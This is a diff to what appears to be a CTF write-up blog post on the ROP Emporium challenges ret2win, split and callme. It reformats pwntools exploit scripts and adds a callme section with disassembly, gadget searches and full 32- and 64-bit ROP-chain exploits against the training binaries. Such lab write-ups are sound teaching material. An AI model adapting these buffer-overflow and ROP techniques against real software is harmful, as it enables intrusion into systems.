@@ -20,6 +20,10 @@ categories: writeups rop-emporium
     </ul>
     </li>
     <li><a href="#callme" id="markdown-toc-h1-header">callme</a>
+    <ul>
+        <li><a href="#32-bit-2" id="markdown-toc-h3-header">32-bit</a></li>
+        <li><a href="#64-bit-2" id="markdown-toc-h3-header">64-bit</a></li>
+    </ul>
     </li>
     <li><a href="#write4" id="markdown-toc-h1-header">write4</a>
     </li>
@@ -264,34 +268,32 @@ gef➤
 
 Quick exploit script written in python.
 ```python
-#!/usr/bin/env python
-
-from pwn import *
-
-context.log_level = 'critical'
-
-elf = ELF("./ret2win")
-
-ret2win_addr = elf.symbols['ret2win']
-
-payload = "A"*40 + "A"*4 # 40 A's for the buffer, 4 A's to overwrite EBP
-payload += p32(ret2win_addr) # Overwrite EIP with the address to ret2win()
-
-sh = elf.process()
-
-sh.recvuntil('> ')
-sh.sendline(payload)
-
-sh.interactive()
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 
+  7 elf = ELF("./ret2win")
+  8 
+  9 ret2win_addr = elf.symbols['ret2win']
+ 10 
+ 11 payload = "A"*44
+ 12 payload += p32(ret2win_addr)
+ 13 
+ 14 sh = elf.process()
+ 15 
+ 16 sh.recvuntil('> ')
+ 17 sh.sendline(payload)
+ 18 
+ 19 print sh.recvall()
 ```
 
 And then, the flag.
 
 ```shell
-root@kali:~/Documents/ropemporium/ret2win/32ret2win# chmod +x exploit.py
-root@kali:~/Documents/ropemporium/ret2win/32ret2win# ./exploit.py 
+~/Documents/ropemporium/ret2win/32ret2win# chmod +x exploit.py && ./exploit.py
 Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
-$ 
 ```
 
 ### 64-bit
@@ -382,33 +384,31 @@ However, we did overwrite RBP, and we know that the return address exists 8 byte
 Note that we still have control of RIP, it's just that we can't write an invalid address to it. Fortunately, the address to the `ret2win()` function *is* a valid address, so the following script does the job.
 
 ```python
-#!/usr/bin/env python
-
-from pwn import *
-
-context.log_level = 'critical'
-
-elf = ELF("./ret2win")
-
-ret2win_addr = elf.symbols['ret2win']
-
-payload = "A"*32 + "A"*8 # 32 A's for the buffer, 8 A's to overwrite RBP
-payload += p64(ret2win_addr) # Overwrite RIP with the address to ret2win()
-
-sh = elf.process()
-
-sh.recvuntil('> ')
-sh.sendline(payload)
-
-sh.interactive()
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 
+  7 elf = ELF("./ret2win")
+  8 
+  9 ret2win_addr = elf.symbols['ret2win']
+ 10 
+ 11 payload = "A"*40
+ 12 payload += p64(ret2win_addr)
+ 13 
+ 14 sh = elf.process()
+ 15 
+ 16 sh.recvuntil('> ')
+ 17 sh.sendline(payload)
+ 18 
+ 19 print sh.recvall()
 ```
 
 Easy.
 ```shell
-root@kali:~/Documents/ropemporium/ret2win/64ret2win# chmod +x exploit.py
-root@kali:~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
+~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
 Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
-$ 
 ```
 
 # split
@@ -512,21 +512,15 @@ Let's take a look at `usefulFunction()`.
 
 This calls `system("/bin/ls")`, which is not what we want. We want `system("/bin/cat flag.txt")`. How do we change the argument that `system()` gets called with?
 
-The way we get around this is to call `system()` ourselves. We set up the stack such that EIP jumps to the address to `system()`'s (thus calling it in the process). We want the first argument to be the address of the string "/bin/cat flag.txt". Therefore, we want the stack to look like this:
+The way we get around this is to call `system()` ourselves. This is how we must set up the stack so we can call `system("/bin/cat flag.txt")`.
 
 ```
-{overwritten_eip_with_addr_to_system}
-            ↓
-{return_addr_of_system}
-            ↓
-{first_argument_of_system}
+              <Top of stack>
+|  {AAAAAAAAAAAAAAAA_buffer_overflow_str}  |
+|  {overwritten_eip_with_addr_to_system}   |
+|  {return_addr_of_system}                 |
+|  {address_to_bin_cat_string}             |
 ```
-
-So this is what we want to do:
-
-1. Overwrite EIP with the address to `system()`
-2. The next four bytes will be the return address of `system()`. This can be gibberish and doesn't matter.
-3. The next four bytes must be the address to the string "/bin/cat flag.txt". This is `system()`'s first argument.
 
 I use rabin2 to find addresses of strings, and gdb to find the address of `system@plt`. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
 ```shell
@@ -556,35 +550,33 @@ Using the same technique detailed in ret2win, I used gdb gef to find that the of
 
 Writing a simple exploit script with the given information.
 ```python
-#!/usr/bin/env python
-
-from pwn import *
-
-context.log_level = 'critical'
-elf = ELF("./split32")
-
-system_addr = p32(0x8048430)
-bin_cat_addr = p32(0x0804a030)
-
-payload = "A"*44
-payload += system_addr # overwrites EIP
-payload += "BBBB" # return address of system()
-payload += bin_cat_addr # first argument of system()
-
-sh = elf.process()
-
-sh.recvuntil("> ")
-sh.sendline(payload)
-
-sh.interactive()
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 elf = ELF("./split32")
+  7 
+  8 system_addr = p32(0x8048430)
+  9 bin_cat_addr = p32(0x0804a030)
+ 10 
+ 11 payload = "A"*44
+ 12 payload += system_addr
+ 13 payload += "BBBB"
+ 14 payload += bin_cat_addr
+ 15 
+ 16 sh = elf.process()
+ 17 
+ 18 sh.recvuntil("> ")
+ 19 sh.sendline(payload)
+ 20 
+ 21 print sh.recvall()
 ```
 
 Running the script.
 ```shell
-root@kali:~/Documents/ropemporium/split/32split# chmod +x ./exploit.py
-root@kali:~/Documents/ropemporium/split/32split# ./exploit.py 
+~/Documents/ropemporium/split/32split# chmod +x exploit.py && ./exploit.py
 ROPE{a_placeholder_32byte_flag!}
-$ 
 ```
 
 ### 64-bit
@@ -665,42 +657,251 @@ Using the same technique detailed in ret2win, I used gdb gef to find that the of
 
 Writing an exploit script.
 ```python
-#!/usr/bin/env python
-
-from pwn import *
-
-context.log_level = 'critical'
-elf = ELF("./split")
-
-system_addr = p64(0x4005e0)
-bin_cat_addr = p64(0x00601060)
-pop_rdi_addr = p64(0x0000000000400883)
-
-payload = "A"*40
-payload += pop_rdi_addr # Address to the pop rdi gadget
-payload += bin_cat_addr # This address gets popped into rdi
-payload += system_addr # The ret will return into this address and execute system()
-
-sh = elf.process()
-
-sh.recvuntil("> ")
-sh.sendline(payload)
-
-sh.interactive()
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 elf = ELF("./split")
+  7 
+  8 system_addr = p64(0x4005e0)
+  9 bin_cat_addr = p64(0x00601060)
+ 10 pop_rdi_addr = p64(0x0000000000400883)
+ 11 
+ 12 payload = "A"*40
+ 13 payload += pop_rdi_addr
+ 14 payload += bin_cat_addr
+ 15 payload += system_addr
+ 16 
+ 17 sh = elf.process()
+ 18 
+ 19 sh.recvuntil("> ")
+ 20 sh.sendline(payload)
+ 21 
+ 22 print sh.recvall()
 ```
 
 Running the exploit.
 ```shell
-root@kali:~/Documents/ropemporium/split/64split# chmod +x ./exploit.py 
-root@kali:~/Documents/ropemporium/split/64split# ./exploit.py 
+~/Documents/ropemporium/split/64split# chmod +x exploit.py && ./exploit.py
 ROPE{a_placeholder_32byte_flag!}
-$  
 ```
 
 # callme
 <a href="{{ page.url }}#title">Back to top ↑</a>
 
-To be added.
+For this challenge, the description tells us we have to call `callme_one(1, 2, 3)`, `callme_two(1, 2, 3)` and `callme_three(1, 2, 3)`, in that order, to get the flag.
+
+### 32-bit
+
+Running checksec.
+```shell
+~/Documents/ropemporium/callme/32callme# checksec callme32
+[*] '/root/Documents/ropemporium/callme/32callme/callme32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+    RPATH:    './'
+
+```
+
+Let's see what its doing.
+```shell
+~/Documents/ropemporium/callme/32callme# r2 callme32
+[0x08048640]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x08048640]> afl
+...
+0x080485b0    1 6            sym.imp.callme_three
+0x080485c0    1 6            sym.imp.callme_one
+...
+0x08048620    1 6            sym.imp.callme_two
+...
+0x0804873b    1 123          sym.main
+0x080487b6    1 86           sym.pwnme
+0x0804880c    1 67           sym.usefulFunction
+...
+[0x08048640]> s sym.pwnme
+[0x080487b6]> pdf
+/ (fcn) sym.pwnme 86
+|   sym.pwnme ();
+|           ; var int local_28h @ ebp-0x28
+|           ; CALL XREF from sym.main (0x8048794)
+|           0x080487b6      55             push ebp
+|           0x080487b7      89e5           mov ebp, esp
+|           0x080487b9      83ec28         sub esp, 0x28               ; '('
+|           0x080487bc      83ec04         sub esp, 4
+|           0x080487bf      6a20           push 0x20                   ; 32
+|           0x080487c1      6a00           push 0
+|           0x080487c3      8d45d8         lea eax, dword [local_28h]
+|           0x080487c6      50             push eax
+|           0x080487c7      e844feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
+|           0x080487cc      83c410         add esp, 0x10
+|           0x080487cf      83ec0c         sub esp, 0xc
+|           0x080487d2      68f8880408     push str.Hope_you_read_the_instructions... ; 0x80488f8 ; "Hope you read the instructions..."
+|           0x080487d7      e8f4fdffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x080487dc      83c410         add esp, 0x10
+|           0x080487df      83ec0c         sub esp, 0xc
+|           0x080487e2      681a890408     push 0x804891a
+|           0x080487e7      e8a4fdffff     call sym.imp.printf         ; int printf(const char *format)
+|           0x080487ec      83c410         add esp, 0x10
+|           0x080487ef      a160a00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; [0x804a060:4]=0
+|           0x080487f4      83ec04         sub esp, 4
+|           0x080487f7      50             push eax
+|           0x080487f8      6800010000     push 0x100                  ; 256
+|           0x080487fd      8d45d8         lea eax, dword [local_28h]
+|           0x08048800      50             push eax
+|           0x08048801      e89afdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+|           0x08048806      83c410         add esp, 0x10
+|           0x08048809      90             nop
+|           0x0804880a      c9             leave
+\           0x0804880b      c3             ret
+[0x080487b6]> 
+```
+
+We see the three `callme()` functions that we have to call in order. `pwnme()` still has the same old buffer overflow vulnerability. This time though, we have to jump to three functions one after another, ***and*** call them with the correct arguments.
+
+The way to do that is by initially setting up the stack so we call `callme_one()` with the arguments `(1, 2, 3)`, then we need to return into a gadget that will pop those three arguments off of the stack. The gadget will then return into `callme_two()` and proceed to do the same thing. I think it's easier to just do it rather than try to explain it.
+
+First, we need the addresses to the three functions.
+```shell
+~/Documents/ropemporium/callme/32callme# rabin2 -i callme32
+[Imports]
+Num  Vaddr       Bind      Type Name
+...
+   4 0x080485b0  GLOBAL    FUNC callme_three
+   5 0x080485c0  GLOBAL    FUNC callme_one
+...
+  12 0x08048620  GLOBAL    FUNC callme_two
+...
+```
+
+Then we need a gadget that pops three values off of the stack before returning.
+```shell
+~/Documents/ropemporium/callme/32callme# ropper -f callme32                                                                                                                                            root@kali
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+
+
+
+Gadgets
+=======
+
+
+...
+0x080488a9: pop esi; pop edi; pop ebp; ret; 
+...
+
+101 gadgets found
+```
+
+Now, we just have to do the exploit step by step.
+```python
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 elf = ELF("./callme32")
+  7 
+  8 callme_one_addr = p32(0x080485c0)
+  9 callme_two_addr = p32(0x08048620)
+ 10 callme_three_addr = p32(0x080485b0)
+ 11 pop_three_addr = p32(0x080488a9)
+ 12 
+ 13 payload = "A"*44 # First overflow the buffer until EIP
+ 14 
+ 15 payload += callme_one_addr # Jump to callme_one()
+ 16 payload += pop_three_addr # callme_one() returns to the gadget, the gadget pops 1,2,3 off the stack
+ 17 payload += p32(0x1) # Argument 1 for callme_one()
+ 18 payload += p32(0x2) # Argument 2 for callme_one()
+ 19 payload += p32(0x3) # Argument 3 for callme_one()
+ 20 
+ 21 payload += callme_two_addr # The gadget then returns into callme_two() and the cycle continues..
+ 22 payload += pop_three_addr
+ 23 payload += p32(0x1)
+ 24 payload += p32(0x2)
+ 25 payload += p32(0x3)
+ 26 
+ 27 payload += callme_three_addr
+ 28 payload += p32(0xdeadbeef) # Return address doesn't matter at this point
+ 29 payload += p32(0x1)
+ 30 payload += p32(0x2)
+ 31 payload += p32(0x3)
+ 32 
+ 33 sh = elf.process()
+ 34 sh.recvuntil("> ")
+ 35 sh.sendline(payload)
+ 36 
+ 37 print sh.recvall()
+```
+
+Running the exploit.
+```shell
+~/Documents/ropemporium/callme/32callme# chmod +x exploit.py && ./exploit.py
+ROPE{a_placeholder_32byte_flag!}
+```
+
+### 64-bit
+
+The 64-bit version is the same, except now instead of popping three values off the stack everytime, we just have to pop those three values into the three registers RDI (first argument), RSI (second argument), and RDX (third argument), in that order. The functions will use the values in those registers as their arguments. I will skip everything except the exploit script since I've already explained how to find the addresses required for the functions and the gadget.
+
+The exploit script.
+
+```python
+  1 #!/usr/bin/env python
+  2 
+  3 from pwn import *
+  4 
+  5 context.log_level = 'critical'
+  6 elf = ELF("./callme")
+  7 
+  8 callme_one_addr = p64(0x00401850)
+  9 callme_two_addr = p64(0x00401870)
+ 10 callme_three_addr = p64(0x00401810)
+ 11 pop_three_addr = p64(0x0000000000401ab0) # pop rdi; pop rsi; pop rdx; ret;
+ 12 
+ 13 payload = "A"*40 # Overflow the buffer
+ 14 payload += pop_three_addr # Jump to the gadget. Each pop instruction will load the following 3 values
+ 15 payload += p64(0x1) # Load 1 into rdi
+ 16 payload += p64(0x2) # Load 2 into rsi
+ 17 payload += p64(0x3) # Load 3 into rdx
+ 18 
+ 19 payload += callme_one_addr # The 'ret; ' instruction returns into callme_one()
+ 20 
+ 21 payload += pop_three_addr # We repeat the same thing to load the three values
+ 22 payload += p64(0x1)
+ 23 payload += p64(0x2)
+ 24 payload += p64(0x3)
+ 25 
+ 26 payload += callme_two_addr # And so on..
+ 27 
+ 28 payload += pop_three_addr
+ 29 payload += p64(0x1)
+ 30 payload += p64(0x2)
+ 31 payload += p64(0x3)
+ 32 
+ 33 payload += callme_three_addr
+ 34 
+ 35 sh = elf.process()
+ 36 sh.recvuntil("> ")
+ 37 sh.sendline(payload)
+ 38 
+ 39 print sh.recvall()
+```
+
+Running the exploit.
+```shell
+~/Documents/ropemporium/callme/64callme# chmod +x exploit.py && ./exploit.py
+ROPE{a_placeholder_32byte_flag!}
+```
 
 # write4
 <a href="{{ page.url }}#title">Back to top ↑</a>
